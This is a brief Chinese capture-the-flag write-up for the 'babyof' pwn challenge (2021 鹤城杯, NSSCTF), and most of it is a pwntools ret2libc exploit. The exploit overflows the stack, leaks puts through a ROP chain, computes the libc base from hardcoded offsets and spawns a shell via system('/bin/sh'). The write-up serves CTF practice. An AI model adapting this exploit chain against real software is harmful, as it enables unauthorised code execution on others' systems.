[[2021 鹤城杯]babyof | NSSCTF](https://www.nssctf.cn/problem/469)
![[Pasted image 20240901105311.png]]
![[Pasted image 20240901105333.png]]
NX开启，无system，无binsh，一道标准的ret2libc题目，不做赘述
exp:
```python
from pwn import *
from LibcSearcher import LibcSearcher

context(arch='amd64', os='linux', log_level='debug')
p = process('./babyof')
# p = remote('node4.anna.nssctf.cn', 28002)
elf = ELF('./babyof')

pwnlib.gdb.attach(p, 'b* 0x400632')

rdi = 0x400743
ret = 0x400506

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x400632

payload = b'a' * (0x40 + 8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendlineafter(b'overflow?', payload)

p.recvuntil(b'win\n')
addr = u64(p.recv(6).ljust(8, b'\x00'))
print(addr)

'''libc = LibcSearcher('puts', addr)
base = addr - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')'''

base = addr - 0x80aa0
system = base + 0x4f550
binsh = base + 0x1b3e1a

payload = b'a' * (0x40 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```
ps:该在本人本地的wsl上跑不通，具体表现为无法泄露出真实地址，但在VMware上以及远程都可正常泄露，暂不知原因，作本地环境有问题处理